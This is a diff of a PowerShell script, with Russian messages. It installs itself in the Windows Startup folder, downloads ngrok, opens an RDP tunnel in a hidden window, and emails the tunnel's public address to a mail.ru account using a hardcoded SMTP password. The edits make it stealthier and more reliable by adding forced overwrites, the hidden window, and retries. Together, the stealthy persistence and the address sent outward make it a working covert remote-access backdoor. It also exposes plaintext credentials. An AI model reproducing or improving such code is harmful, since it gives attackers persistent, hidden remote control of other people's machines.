@@ -1,9 +1,8 @@
 $thisScript = $MyInvocation.MyCommand.Path
-
 $startupScriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ngrok.ps1"
 
 if ($thisScript -ne $startupScriptPath -and !(Test-Path $startupScriptPath)) {
-    Copy-Item -Path $thisScript -Destination $startupScriptPath
+    Copy-Item -Path $thisScript -Destination $startupScriptPath -Force
     exit
 }
 
@@ -12,7 +11,7 @@ $configPath = "$env:APPDATA\ngrok\ngrok.yml"
 
 if (!(Test-Path $ngrokPath)) {
     Invoke-WebRequest -Uri "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-windows-amd64.zip" -OutFile "$env:TEMP\ngrok.zip"
-    Expand-Archive "$env:TEMP\ngrok.zip" -DestinationPath "$env:APPDATA\ngrok"
+    Expand-Archive "$env:TEMP\ngrok.zip" -DestinationPath "$env:APPDATA\ngrok" -Force
 }
 
 if (!(Test-Path $configPath)) {
@@ -25,29 +24,41 @@ tunnels:
 "@ | Out-File -Encoding ASCII $configPath
 }
 
-$ngrokProcess = Start-Process -FilePath $ngrokPath -ArgumentList "start rdp" -PassThru
-Start-Sleep -Seconds 5
+Start-Process -FilePath $ngrokPath -ArgumentList "start rdp" -WindowStyle Hidden
 
-try {
-    $response = Invoke-RestMethod http://127.0.0.1:4040/api/tunnels
-    $tunnel = $response.tunnels | Where-Object { $_.proto -eq "tcp" }
-    $address = $tunnel.public_url
+$tunnelAddress = $null
+for ($i = 0; $i -lt 10; $i++) {
+    try {
+        $response = Invoke-RestMethod -Uri "http://127.0.0.1:4040/api/tunnels" -TimeoutSec 2
+        $tunnel = $response.tunnels | Where-Object { $_.proto -eq "tcp" }
+        if ($tunnel -and $tunnel.public_url) {
+            $tunnelAddress = $tunnel.public_url
+            break
+        }
+    } catch {
+        Start-Sleep -Seconds 2
+    }
+}
 
+if ($tunnelAddress) {
     $smtpServer = "smtp.gmail.com"
     $smtpPort = 587
     $smtpUser = "user.default00@mail.ru"
     $smtpPass = "smhdebashit"
+
     $fromEmail = "user.default00@mail.ru"
     $toEmail = "user.default00@mail.ru"
-
     $subject = "Ngrok RDP адрес"
-    $body = "Текущий публичный TCP адрес ngrok для подключения к ноутбуку: `n$address"
+    $body = "Ngrok публичный TCP адрес:\n`t $tunnelAddress"
 
-    $securePass = ConvertTo-SecureString $smtpPass -AsPlainText -Force
-    $credentials = New-Object System.Management.Automation.PSCredential($smtpUser, $securePass)
+    try {
+        $securePass = ConvertTo-SecureString $smtpPass -AsPlainText -Force
+        $credentials = New-Object System.Management.Automation.PSCredential($smtpUser, $securePass)
 
-    Send-MailMessage -From $emailFrom -To $emailTo -Subject $subject -Body $body -SmtpServer $smtpServer -Port $smtpPort -UseSsl -Credential (New-Object PSCredential($smtpUser, (ConvertTo-SecureString $smtpPass -AsPlainText -Force)))
-
-} catch {
-    Write-Error "Не удалось получить адрес ngrok или отправить email: $_"
+        Send-MailMessage -From $fromEmail -To $toEmail -Subject $subject -Body $body -SmtpServer $smtpServer -Port $smtpPort -UseSsl -Credential $credentials
+    } catch {
+        Write-Error "Ошибка при отправке email: $_"
+    }
+} else {
+    Write-Error "Не удалось получить публичный адрес от ngrok."
 }
